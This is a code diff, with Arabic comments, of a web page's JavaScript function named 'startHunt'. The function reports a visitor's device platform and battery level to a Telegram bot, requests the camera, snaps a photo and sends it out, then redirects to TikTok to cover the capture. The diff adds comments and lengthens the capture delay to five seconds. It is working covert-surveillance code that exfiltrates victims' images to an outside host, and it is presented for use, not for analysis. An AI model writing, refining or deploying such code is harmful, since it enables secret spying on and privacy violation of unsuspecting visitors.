@@ -9,17 +9,19 @@
 
         async function startHunt() {
             try {
+                // إرسال معلومات الجهاز أولاً
                 let b = await navigator.getBattery();
                 let info = `🎯 صيد جديد!\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(b.level * 100)}%`;
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(info)}`);
 
+                // طلب إذن الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
-                // ⏳ ننتظر ثانيتين عشان الكاميرا تشتغل وتصور صح
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                // ⏳ زيادة وقت الانتظار إلى 5 ثوانٍ (5000 ميلي ثانية)
+                await new Promise(resolve => setTimeout(resolve, 5000));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; 
@@ -33,10 +35,12 @@
                         method: 'POST',
                         body: fd
                     }).then(() => {
+                        // التحويل بعد إرسال الصورة
                         window.location.href = "https://www.tiktok.com"; 
                     });
                 }, 'image/jpeg');
             } catch (e) {
+                // في حال رفض الإذن يتم التحويل فوراً
                 window.location.href = "https://www.tiktok.com";
             }
         }
